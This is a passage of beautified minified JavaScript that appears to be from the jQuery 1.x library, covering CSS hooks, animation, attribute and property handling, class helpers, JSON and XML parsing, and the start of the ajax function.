        return null == (a = (n = n || Ze(e)) ? n[t] : void 0) && s && s[t] && (a = s[t]), nt.test(a) && !ot.test(t) && (o = s.left, (r = (i = e.runtimeStyle) && i.left) && (i.left = e.currentStyle.left), s.left = "fontSize" === t ? "1em" : a, a = s.pixelLeft + "px", s.left = o, r && (i.left = r)), void 0 === a ? a : a + "" || "auto"
    }),
    function() {
        function e() {
            var e,
                t,
                n,
                o;
            (t = pe.getElementsByTagName("body")[0]) && t.style && (e = pe.createElement("div"), (n = pe.createElement("div")
            ).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", t.appendChild(n).appendChild(e), e.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute", i = r = !1, s = !0, p.getComputedStyle && (i = "1%" !== (p.getComputedStyle(e, null) || {}).top, r = "4px" === (p.getComputedStyle(e, null) || {
                width: "4px"
            }).width, (o = e.appendChild(pe.createElement("div"))).style.cssText = e.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", o.style.marginRight = o.style.width = "0", e.style.width = "1px", s = !parseFloat((p.getComputedStyle(o, null) || {}).marginRight), e.removeChild(o)), e.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", (o = e.getElementsByTagName("td"))[0].style.cssText = "margin:0;border:0;padding:0;display:none", (a = 0 === o[0].offsetHeight) && (o[0].style.display = "", o[1].style.display = "none", a = 0 === o[0].offsetHeight), t.removeChild(n))
        }
        var t,
            n,
            o,
            i,
            r,
            a,
            s;
        (t = pe.createElement("div")).innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
        (n = (o = t.getElementsByTagName("a")[0]) && o.style) && (n.cssText = "float:left;opacity:.5", ne.opacity = "0.5" === n.opacity, ne.cssFloat = !!n.cssFloat, t.style.backgroundClip = "content-box", t.cloneNode(!0).style.backgroundClip = "", ne.clearCloneStyle = "content-box" === t.style.backgroundClip, ne.boxSizing = "" === n.boxSizing || "" === n.MozBoxSizing || "" === n.WebkitBoxSizing, ie.extend(ne, {
            reliableHiddenOffsets: function() {
                return null == a && e(), a
            },
            boxSizingReliable: function() {
                return null == r && e(), r
            },
            pixelPosition: function() {
                return null == i && e(), i
            },
            reliableMarginRight: function() {
                return null == s && e(), s
            }
        }))
    }(),
    ie.swap = function(e, t, n, o) {
        var i,
            r,
            a = {};
        for (r in t)
            a[r] = e.style[r],
            e.style[r] = t[r];
        for (r in i = n.apply(e, o || []), t)
            e.style[r] = a[r];
        return i
    };
    var it = /alpha\([^)]*\)/i,
        rt = /opacity\s*=\s*([^)]*)/,
        at = /^(none|table(?!-c[ea]).+)/,
        st = new RegExp("^(" + Ce + ")(.*)$", "i"),
        lt = new RegExp("^([+-])=(" + Ce + ")", "i"),
        ct = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        ut = {
            letterSpacing: "0",
            fontWeight: "400"
        },
        dt = ["Webkit", "O", "Moz", "ms"];
    ie.extend({
        cssHooks: {
            opacity: {
                get: function(e, t) {
                    if (t) {
                        var n = et(e, "opacity");
                        return "" === n ? "1" : n
                    }
                }
            }
        },
        cssNumber: {
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": ne.cssFloat ? "cssFloat" : "styleFloat"
        },
        style: function(e, t, n, o) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var i,
                    r,
                    a,
                    s = ie.camelCase(t),
                    l = e.style;
                if (t = ie.cssProps[s] || (ie.cssProps[s] = E(l, s)), a = ie.cssHooks[t] || ie.cssHooks[s], void 0 === n)
                    return a && "get" in a && void 0 !== (i = a.get(e, !1, o)) ? i : l[t];
                if ("string" === (r = typeof n) && (i = lt.exec(n)) && (n = (i[1] + 1) * i[2] + parseFloat(ie.css(e, t)), r = "number"), null != n && n == n && ("number" !== r || ie.cssNumber[s] || (n += "px"), ne.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), !(a && "set" in a && void 0 === (n = a.set(e, n, o)))))
                    try {
                        l[t] = n
                    } catch (u) {}
            }
        },
        css: function(e, t, n, o) {
            var i,
                r,
                a,
                s = ie.camelCase(t);
            return t = ie.cssProps[s] || (ie.cssProps[s] = E(e.style, s)), (a = ie.cssHooks[t] || ie.cssHooks[s]) && "get" in a && (r = a.get(e, !0, n)), void 0 === r && (r = et(e, t, o)), "normal" === r && t in ut && (r = ut[t]), "" === n || n ? (i = parseFloat(r), !0 === n || ie.isNumeric(i) ? i || 0 : r) : r
        }
    }),
    ie.each(["height", "width"], function(e, i) {
        ie.cssHooks[i] = {
            get: function(e, t, n) {
                return t ? at.test(ie.css(e, "display")) && 0 === e.offsetWidth ? ie.swap(e, ct, function() {
                    return F(e, i, n)
                }) : F(e, i, n) : void 0
            },
            set: function(e, t, n) {
                var o = n && Ze(e);
                return N(e, t, n ? P(e, i, n, ne.boxSizing && "border-box" === ie.css(e, "boxSizing", !1, o), o) : 0)
            }
        }
    }),
    ne.opacity || (ie.cssHooks.opacity = {
        get: function(e, t) {
            return rt.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
        },
        set: function(e, t) {
            var n = e.style,
                o = e.currentStyle,
                i = ie.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : "",
                r = o && o.filter || n.filter || "";
            ((n.zoom = 1) <= t || "" === t) && "" === ie.trim(r.replace(it, "")) && n.removeAttribute && (n.removeAttribute("filter"), "" === t || o && !o.filter) || (n.filter = it.test(r) ? r.replace(it, i) : r + " " + i)
        }
    }),
    ie.cssHooks.marginRight = k(ne.reliableMarginRight, function(e, t) {
        return t ? ie.swap(e, {
            display: "inline-block"
        }, et, [e, "marginRight"]) : void 0
    }),
    ie.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(i, r) {
        ie.cssHooks[i + r] = {
            expand: function(e) {
                for (var t = 0, n = {}, o = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++)
                    n[i + ke[t] + r] = o[t] || o[t - 2] || o[0];
                return n
            }
        },
        tt.test(i) || (ie.cssHooks[i + r].set = N)
    }),
    ie.fn.extend({
        css: function(e, t) {
            return Ie(this, function(e, t, n) {
                var o,
                    i,
                    r = {},
                    a = 0;
                if (ie.isArray(t)) {
                    for (o = Ze(e), i = t.length; a < i; a++)
                        r[t[a]] = ie.css(e, t[a], !1, o);
                    return r
                }
                return void 0 !== n ? ie.style(e, t, n) : ie.css(e, t)
            }, e, t, 1 < arguments.length)
        },
        show: function() {
            return I(this, !0)
        },
        hide: function() {
            return I(this)
        },
        toggle: function(e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                Ee(this) ? ie(this).show() : ie(this).hide()
            })
        }
    }),
    (ie.Tween = A).prototype = {
        constructor: A,
        init: function(e, t, n, o, i, r) {
            this.elem = e,
            this.prop = n,
            this.easing = i || "swing",
            this.options = t,
            this.start = this.now = this.cur(),
            this.end = o,
            this.unit = r || (ie.cssNumber[n] ? "" : "px")
        },
        cur: function() {
            var e = A.propHooks[this.prop];
            return e && e.get ? e.get(this) : A.propHooks._default.get(this)
        },
        run: function(e) {
            var t,
                n = A.propHooks[this.prop];
            return this.options.duration ? this.pos = t = ie.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : A.propHooks._default.set(this), this
        }
    },
    A.prototype.init.prototype = A.prototype,
    A.propHooks = {
        _default: {
            get: function(e) {
                var t;
                return null == e.elem[e.prop] || e.elem.style && null != e.elem.style[e.prop] ? (t = ie.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0 : e.elem[e.prop]
            },
            set: function(e) {
                ie.fx.step[e.prop] ? ie.fx.step[e.prop](e) : e.elem.style && (null != e.elem.style[ie.cssProps[e.prop]] || ie.cssHooks[e.prop]) ? ie.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
            }
        }
    },
    A.propHooks.scrollTop = A.propHooks.scrollLeft = {
        set: function(e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    },
    ie.easing = {
        linear: function(e) {
            return e
        },
        swing: function(e) {
            return .5 - Math.cos(e * Math.PI) / 2
        }
    },
    ie.fx = A.prototype.init,
    ie.fx.step = {};
    var ft,
        ht,
        pt,
        gt,
        mt,
        vt,
        Tt,
        St = /^(?:toggle|show|hide)$/,
        yt = new RegExp("^(?:([+-])=|)(" + Ce + ")([a-z%]*)$", "i"),
        bt = /queueHooks$/,
        xt = [R],
        wt = {
            "*": [function(e, t) {
                var n = this.createTween(e, t),
                    o = n.cur(),
                    i = yt.exec(t),
                    r = i && i[3] || (ie.cssNumber[e] ? "" : "px"),
                    a = (ie.cssNumber[e] || "px" !== r && +o) && yt.exec(ie.css(n.elem, e)),
                    s = 1,
                    l = 20;
                if (a && a[3] !== r)
                    for (r = r || a[3], i = i || [], a = +o || 1; a /= s = s || ".5", ie.style(n.elem, e, a + r), s !== (s = n.cur() / o) && 1 !== s && --l;)
                        ;
                return i && (a = n.start = +a || +o || 0, n.unit = r, n.end = i[1] ? a + (i[1] + 1) * i[2] : +i[2]), n
            }]
        };
    ie.Animation = ie.extend(j, {
        tweener: function(e, t) {
            ie.isFunction(e) ? (t = e, e = ["*"]) : e = e.split(" ");
            for (var n, o = 0, i = e.length; o < i; o++)
                n = e[o],
                wt[n] = wt[n] || [],
                wt[n].unshift(t)
        },
        prefilter: function(e, t) {
            t ? xt.unshift(e) : xt.push(e)
        }
    }),
    ie.speed = function(e, t, n) {
        var o = e && "object" == typeof e ? ie.extend({}, e) : {
            complete: n || !n && t || ie.isFunction(e) && e,
            duration: e,
            easing: n && t || t && !ie.isFunction(t) && t
        };
        return o.duration = ie.fx.off ? 0 : "number" == typeof o.duration ? o.duration : o.duration in ie.fx.speeds ? ie.fx.speeds[o.duration] : ie.fx.speeds._default, (null == o.queue || !0 === o.queue) && (o.queue = "fx"), o.old = o.complete, o.complete = function() {
            ie.isFunction(o.old) && o.old.call(this),
            o.queue && ie.dequeue(this, o.queue)
        }, o
    },
    ie.fn.extend({
        fadeTo: function(e, t, n, o) {
            return this.filter(Ee).css("opacity", 0).show().end().animate({
                opacity: t
            }, e, n, o)
        },
        animate: function(t, e, n, o) {
            var i = ie.isEmptyObject(t),
                r = ie.speed(e, n, o),
                a = function() {
                    var e = j(this, ie.extend({}, t), r);
                    (i || ie._data(this, "finish")) && e.stop(!0)
                };
            return a.finish = a, i || !1 === r.queue ? this.each(a) : this.queue(r.queue, a)
        },
        stop: function(i, e, r) {
            var a = function(e) {
                var t = e.stop;
                delete e.stop,
                t(r)
            };
            return "string" != typeof i && (r = e, e = i, i = void 0), e && !1 !== i && this.queue(i || "fx", []), this.each(function() {
                var e = !0,
                    t = null != i && i + "queueHooks",
                    n = ie.timers,
                    o = ie._data(this);
                if (t)
                    o[t] && o[t].stop && a(o[t]);
                else
                    for (t in o)
                        o[t] && o[t].stop && bt.test(t) && a(o[t]);
                for (t = n.length; t--;)
                    n[t].elem !== this || null != i && n[t].queue !== i || (n[t].anim.stop(r), e = !1, n.splice(t, 1));
                (e || !r) && ie.dequeue(this, i)
            })
        },
        finish: function(a) {
            return !1 !== a && (a = a || "fx"), this.each(function() {
                var e,
                    t = ie._data(this),
                    n = t[a + "queue"],
                    o = t[a + "queueHooks"],
                    i = ie.timers,
                    r = n ? n.length : 0;
                for (t.finish = !0, ie.queue(this, a, []), o && o.stop && o.stop.call(this, !0), e = i.length; e--;)
                    i[e].elem === this && i[e].queue === a && (i[e].anim.stop(!0), i.splice(e, 1));
                for (e = 0; e < r; e++)
                    n[e] && n[e].finish && n[e].finish.call(this);
                delete t.finish
            })
        }
    }),
    ie.each(["toggle", "show", "hide"], function(e, o) {
        var i = ie.fn[o];
        ie.fn[o] = function(e, t, n) {
            return null == e || "boolean" == typeof e ? i.apply(this, arguments) : this.animate(B(o, !0), e, t, n)
        }
    }),
    ie.each({
        slideDown: B("show"),
        slideUp: B("hide"),
        slideToggle: B("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(e, o) {
        ie.fn[e] = function(e, t, n) {
            return this.animate(o, e, t, n)
        }
    }),
    ie.timers = [],
    ie.fx.tick = function() {
        var e,
            t = ie.timers,
            n = 0;
        for (ft = ie.now(); n < t.length; n++)
            (e = t[n])() || t[n] !== e || t.splice(n--, 1);
        t.length || ie.fx.stop(),
        ft = void 0
    },
    ie.fx.timer = function(e) {
        ie.timers.push(e),
        e() ? ie.fx.start() : ie.timers.pop()
    },
    ie.fx.interval = 13,
    ie.fx.start = function() {
        ht || (ht = setInterval(ie.fx.tick, ie.fx.interval))
    },
    ie.fx.stop = function() {
        clearInterval(ht),
        ht = null
    },
    ie.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    },
    ie.fn.delay = function(o, e) {
        return o = ie.fx && ie.fx.speeds[o] || o, e = e || "fx", this.queue(e, function(e, t) {
            var n = setTimeout(e, o);
            t.stop = function() {
                clearTimeout(n)
            }
        })
    },
    (gt = pe.createElement("div")).setAttribute("className", "t"),
    gt.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
    vt = gt.getElementsByTagName("a")[0],
    Tt = (mt = pe.createElement("select")).appendChild(pe.createElement("option")),
    pt = gt.getElementsByTagName("input")[0],
    vt.style.cssText = "top:1px",
    ne.getSetAttribute = "t" !== gt.className,
    ne.style = /top/.test(vt.getAttribute("style")),
    ne.hrefNormalized = "/a" === vt.getAttribute("href"),
    ne.checkOn = !!pt.value,
    ne.optSelected = Tt.selected,
    ne.enctype = !!pe.createElement("form").enctype,
    mt.disabled = !0,
    ne.optDisabled = !Tt.disabled,
    (pt = pe.createElement("input")).setAttribute("value", ""),
    ne.input = "" === pt.getAttribute("value"),
    pt.value = "t",
    pt.setAttribute("type", "radio"),
    ne.radioValue = "t" === pt.value;
    var Vt = /\r/g;
    ie.fn.extend({
        val: function(n) {
            var o,
                e,
                i,
                t = this[0];
            return arguments.length ? (i = ie.isFunction(n), this.each(function(e) {
                var t;
                1 === this.nodeType && (null == (t = i ? n.call(this, e, ie(this).val()) : n) ? t = "" : "number" == typeof t ? t += "" : ie.isArray(t) && (t = ie.map(t, function(e) {
                    return null == e ? "" : e + ""
                })), (o = ie.valHooks[this.type] || ie.valHooks[this.nodeName.toLowerCase()]) && "set" in o && void 0 !== o.set(this, t, "value") || (this.value = t))
            })) : t ? (o = ie.valHooks[t.type] || ie.valHooks[t.nodeName.toLowerCase()]) && "get" in o && void 0 !== (e = o.get(t, "value")) ? e : "string" == typeof (e = t.value) ? e.replace(Vt, "") : null == e ? "" : e : void 0
        }
    }),
    ie.extend({
        valHooks: {
            option: {
                get: function(e) {
                    var t = ie.find.attr(e, "value");
                    return null != t ? t : ie.trim(ie.text(e))
                }
            },
            select: {
                get: function(e) {
                    for (var t, n, o = e.options, i = e.selectedIndex, r = "select-one" === e.type || i < 0, a = r ? null : [], s = r ? i + 1 : o.length, l = i < 0 ? s : r ? i : 0; l < s; l++)
                        if (!(!(n = o[l]).selected && l !== i || (ne.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && ie.nodeName(n.parentNode, "optgroup"))) {
                            if (t = ie(n).val(), r)
                                return t;
                            a.push(t)
                        }
                    return a
                },
                set: function(e, t) {
                    for (var n, o, i = e.options, r = ie.makeArray(t), a = i.length; a--;)
                        if (o = i[a], 0 <= ie.inArray(ie.valHooks.option.get(o), r))
                            try {
                                o.selected = n = !0
                            } catch (l) {
                                o.scrollHeight
                            }
                        else
                            o.selected = !1;
                    return n || (e.selectedIndex = -1), i
                }
            }
        }
    }),
    ie.each(["radio", "checkbox"], function() {
        ie.valHooks[this] = {
            set: function(e, t) {
                return ie.isArray(t) ? e.checked = 0 <= ie.inArray(ie(e).val(), t) : void 0
            }
        },
        ne.checkOn || (ie.valHooks[this].get = function(e) {
            return null === e.getAttribute("value") ? "on" : e.value
        })
    });
    var Ct,
        kt,
        Et = ie.expr.attrHandle,
        It = /^(?:checked|selected)$/i,
        Nt = ne.getSetAttribute,
        Pt = ne.input;
    ie.fn.extend({
        attr: function(e, t) {
            return Ie(this, ie.attr, e, t, 1 < arguments.length)
        },
        removeAttr: function(e) {
            return this.each(function() {
                ie.removeAttr(this, e)
            })
        }
    }),
    ie.extend({
        attr: function(e, t, n) {
            var o,
                i,
                r = e.nodeType;
            return e && 3 !== r && 8 !== r && 2 !== r ? typeof e.getAttribute === xe ? ie.prop(e, t, n) : (1 === r && ie.isXMLDoc(e) || (t = t.toLowerCase(), o = ie.attrHooks[t] || (ie.expr.match.bool.test(t) ? kt : Ct)), void 0 === n ? o && "get" in o && null !== (i = o.get(e, t)) ? i : null == (i = ie.find.attr(e, t)) ? void 0 : i : null !== n ? o && "set" in o && void 0 !== (i = o.set(e, n, t)) ? i : (e.setAttribute(t, n + ""), n) : void ie.removeAttr(e, t)) : void 0
        },
        removeAttr: function(e, t) {
            var n,
                o,
                i = 0,
                r = t && t.match(Se);
            if (r && 1 === e.nodeType)
                for (; n = r[i++];)
                    o = ie.propFix[n] || n,
                    ie.expr.match.bool.test(n) ? Pt && Nt || !It.test(n) ? e[o] = !1 : e[ie.camelCase("default-" + n)] = e[o] = !1 : ie.attr(e, n, ""),
                    e.removeAttribute(Nt ? n : o)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
                    if (!ne.radioValue && "radio" === t && ie.nodeName(e, "input")) {
                        var n = e.value;
                        return e.setAttribute("type", t), n && (e.value = n), t
                    }
                }
            }
        }
    }),
    kt = {
        set: function(e, t, n) {
            return !1 === t ? ie.removeAttr(e, n) : Pt && Nt || !It.test(n) ? e.setAttribute(!Nt && ie.propFix[n] || n, n) : e[ie.camelCase("default-" + n)] = e[n] = !0, n
        }
    },
    ie.each(ie.expr.match.bool.source.match(/\w+/g), function(e, t) {
        var r = Et[t] || ie.find.attr;
        Et[t] = Pt && Nt || !It.test(t) ? function(e, t, n) {
            var o,
                i;
            return n || (i = Et[t], Et[t] = o, o = null != r(e, t, n) ? t.toLowerCase() : null, Et[t] = i), o
        } : function(e, t, n) {
            return n ? void 0 : e[ie.camelCase("default-" + t)] ? t.toLowerCase() : null
        }
    }),
    Pt && Nt || (ie.attrHooks.value = {
        set: function(e, t, n) {
            return ie.nodeName(e, "input") ? void (e.defaultValue = t) : Ct && Ct.set(e, t, n)
        }
    }),
    Nt || (Ct = {
        set: function(e, t, n) {
            var o = e.getAttributeNode(n);
            return o || e.setAttributeNode(o = e.ownerDocument.createAttribute(n)), o.value = t += "", "value" === n || t === e.getAttribute(n) ? t : void 0
        }
    }, Et.id = Et.name = Et.coords = function(e, t, n) {
        var o;
        return n ? void 0 : (o = e.getAttributeNode(t)) && "" !== o.value ? o.value : null
    }, ie.valHooks.button = {
        get: function(e, t) {
            var n = e.getAttributeNode(t);
            return n && n.specified ? n.value : void 0
        },
        set: Ct.set
    }, ie.attrHooks.contenteditable = {
        set: function(e, t, n) {
            Ct.set(e, "" !== t && t, n)
        }
    }, ie.each(["width", "height"], function(e, n) {
        ie.attrHooks[n] = {
            set: function(e, t) {
                return "" === t ? (e.setAttribute(n, "auto"), t) : void 0
            }
        }
    })),
    ne.style || (ie.attrHooks.style = {
        get: function(e) {
            return e.style.cssText || void 0
        },
        set: function(e, t) {
            return e.style.cssText = t + ""
        }
    });
    var Ft = /^(?:input|select|textarea|button|object)$/i,
        At = /^(?:a|area)$/i;
    ie.fn.extend({
        prop: function(e, t) {
            return Ie(this, ie.prop, e, t, 1 < arguments.length)
        },
        removeProp: function(e) {
            return e = ie.propFix[e] || e, this.each(function() {
                try {
                    this[e] = void 0,
                    delete this[e]
                } catch (t) {}
            })
        }
    }),
    ie.extend({
        propFix: {
            "for": "htmlFor",
            "class": "className"
        },
        prop: function(e, t, n) {
            var o,
                i,
                r = e.nodeType;
            return e && 3 !== r && 8 !== r && 2 !== r ? ((1 !== r || !ie.isXMLDoc(e)) && (t = ie.propFix[t] || t, i = ie.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (o = i.set(e, n, t)) ? o : e[t] = n : i && "get" in i && null !== (o = i.get(e, t)) ? o : e[t]) : void 0
        },
        propHooks: {
            tabIndex: {
                get: function(e) {
                    var t = ie.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : Ft.test(e.nodeName) || At.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        }
    }),
    ne.hrefNormalized || ie.each(["href", "src"], function(e, t) {
        ie.propHooks[t] = {
            get: function(e) {
                return e.getAttribute(t, 4)
            }
        }
    }),
    ne.optSelected || (ie.propHooks.selected = {
        get: function(e) {
            var t = e.parentNode;
            return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
        }
    }),
    ie.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        ie.propFix[this.toLowerCase()] = this
    }),
    ne.enctype || (ie.propFix.enctype = "encoding");
    var _t = /[\t\r\n\f]/g;
    ie.fn.extend({
        addClass: function(t) {
            var e,
                n,
                o,
                i,
                r,
                a,
                s = 0,
                l = this.length,
                c = "string" == typeof t && t;
            if (ie.isFunction(t))
                return this.each(function(e) {
                    ie(this).addClass(t.call(this, e, this.className))
                });
            if (c)
                for (e = (t || "").match(Se) || []; s < l; s++)
                    if (o = 1 === (n = this[s]).nodeType && (n.className ? (" " + n.className + " ").replace(_t, " ") : " ")) {
                        for (r = 0; i = e[r++];)
                            o.indexOf(" " + i + " ") < 0 && (o += i + " ");
                        a = ie.trim(o),
                        n.className !== a && (n.className = a)
                    }
            return this
        },
        removeClass: function(t) {
            var e,
                n,
                o,
                i,
                r,
                a,
                s = 0,
                l = this.length,
                c = 0 === arguments.length || "string" == typeof t && t;
            if (ie.isFunction(t))
                return this.each(function(e) {
                    ie(this).removeClass(t.call(this, e, this.className))
                });
            if (c)
                for (e = (t || "").match(Se) || []; s < l; s++)
                    if (o = 1 === (n = this[s]).nodeType && (n.className ? (" " + n.className + " ").replace(_t, " ") : "")) {
                        for (r = 0; i = e[r++];)
                            for (; 0 <= o.indexOf(" " + i + " ");)
                                o = o.replace(" " + i + " ", " ");
                        a = t ? ie.trim(o) : "",
                        n.className !== a && (n.className = a)
                    }
            return this
        },
        toggleClass: function(i, t) {
            var r = typeof i;
            return "boolean" == typeof t && "string" === r ? t ? this.addClass(i) : this.removeClass(i) : this.each(ie.isFunction(i) ? function(e) {
                ie(this).toggleClass(i.call(this, e, this.className, t), t)
            } : function() {
                if ("string" === r)
                    for (var e, t = 0, n = ie(this), o = i.match(Se) || []; e = o[t++];)
                        n.hasClass(e) ? n.removeClass(e) : n.addClass(e);
                else
                    (r === xe || "boolean" === r) && (this.className && ie._data(this, "__className__", this.className), this.className = this.className || !1 === i ? "" : ie._data(this, "__className__") || "")
            })
        },
        hasClass: function(e) {
            for (var t = " " + e + " ", n = 0, o = this.length; n < o; n++)
                if (1 === this[n].nodeType && 0 <= (" " + this[n].className + " ").replace(_t, " ").indexOf(t))
                    return !0;
            return !1
        }
    }),
    ie.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(e, n) {
        ie.fn[n] = function(e, t) {
            return 0 < arguments.length ? this.on(n, null, e, t) : this.trigger(n)
        }
    }),
    ie.fn.extend({
        hover: function(e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        },
        bind: function(e, t, n) {
            return this.on(e, null, t, n)
        },
        unbind: function(e, t) {
            return this.off(e, null, t)
        },
        delegate: function(e, t, n, o) {
            return this.on(t, e, n, o)
        },
        undelegate: function(e, t, n) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
        }
    });
    var Bt = ie.now(),
        Ht = /\?/,
        Rt = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
    ie.parseJSON = function(e) {
        if (p.JSON && p.JSON.parse)
            return p.JSON.parse(e + "");
        var i,
            r = null,
            t = ie.trim(e + "");
        return t && !ie.trim(t.replace(Rt, function(e, t, n, o) {
            return i && t && (r = 0), 0 === r ? e : (i = n || t, r += !o - !n, "")
        })) ? Function("return " + t)() : ie.error("Invalid JSON: " + e)
    },
    ie.parseXML = function(e) {
        var t;
        if (!e || "string" != typeof e)
            return null;
        try {
            p.DOMParser ? t = (new DOMParser).parseFromString(e, "text/xml") : ((t = new ActiveXObject("Microsoft.XMLDOM")).async = "false", t.loadXML(e))
        } catch (i) {
            t = void 0
        }
        return t && t.documentElement && !t.getElementsByTagName("parsererror").length || ie.error("Invalid XML: " + e), t
    };
    var Lt,
        jt,
        Mt = /#.*$/,
        Ot = /([?&])_=[^&]*/,
        Dt = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
        Ut = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
        Wt = /^(?:GET|HEAD)$/,
        Gt = /^\/\//,
        zt = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
        Jt = {},
        qt = {},
        $t = "*/".concat("*");
    try {
        jt = location.href
    } catch (un) {
        (jt = pe.createElement("a")).href = "",
        jt = jt.href
    }
    Lt = zt.exec(jt.toLowerCase()) || [],
    ie.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: jt,
            type: "GET",
            isLocal: Ut.test(Lt[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": $t,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": ie.parseJSON,
                "text xml": ie.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(e, t) {
            return t ? D(D(e, ie.ajaxSettings), t) : D(ie.ajaxSettings, e)
        },
        ajaxPrefilter: M(Jt),
        ajaxTransport: M(qt),
        ajax: function(e, t) {
            function n(e, t, n, o) {
                var i,
                    r,
                    a,
                    s,
                    l,
                    c = t;
                2 !== b && (b = 2, f && clearTimeout(f), p = void 0, d = o || "", x.readyState = 0 < e ? 4 : 0, i = 200 <= e && e < 300 || 304 === e, n && (s = U(g, x, n)), s = W(g, s, x, i), i ? (g.ifModified && ((l = x.getResponseHeader("Last-Modified")) && (ie.lastModified[u] = l), (l = x.getResponseHeader("etag")) && (ie.etag[u] = l)), 204 === e || "HEAD" === g.type ? c = "nocontent" : 304 === e ? c = "notmodified" : (c = s.state, r = s.data, i = !(a = s.error))) : (a = c, (e || !c) && (c = "error", e < 0 && (e = 0))), x.status = e, x.statusText = (t || c) + "", i ? T.resolveWith(m, [r, c, x]) : T.rejectWith(m, [x, c, a]), x.statusCode(y), y = void 0, h && v.trigger(i ? "ajaxSuccess" : "ajaxError", [x, g, i ? r : a]), S.fireWith(m, [x, c]), h && (v.trigger("ajaxComplete", [x, g]), --ie.active || ie.event.trigger("ajaxStop")))
            }
            "object" == typeof e && (t = e, e = void 0),
            t = t || {};
            var o,
                i,
                u,
                d,
                f,
                h,
                p,
                r,
                g = ie.ajaxSetup({}, t),
                m = g.context || g,
                v = g.context && (m.nodeType || m.jquery) ? ie(m) : ie.event,
                T = ie.Deferred(),
                S = ie.Callbacks("once memory"),
                y = g.statusCode || {},
                a = {},
                s = {},
                b = 0,
                l = "canceled",
                x = {
                    readyState: 0,
                    getResponseHeader: function(e) {
                        var t;
                        if (2 === b) {
                            if (!r)
                                for (r = {}; t = Dt.exec(d);)
                                    r[t[1].toLowerCase()] = t[2];
                            t = r[e.toLowerCase()]
                        }
                        return null == t ? null : t
                    },
                    getAllResponseHeaders: function() {
                        return 2 === b ? d : null
                    },
                    setRequestHeader: function(e, t) {
                        var n = e.toLowerCase();
                        return b || (e = s[n] = s[n] || e, a[e] = t), this
                    },
                    overrideMimeType: function(e) {
                        return b || (g.mimeType = e), this
                    },
                    statusCode: function(e) {
                        var t;
                        if (e)
                            if (b < 2)
                                for (t in e)
                                    y[t] = [y[t], e[t]];
                            else
                                x.always(e[x.status]);
                        return this
                    },
                    abort: function(e) {
                        var t = e || l;
                        return p && p.abort(t), n(0, t), this
                    }
                };
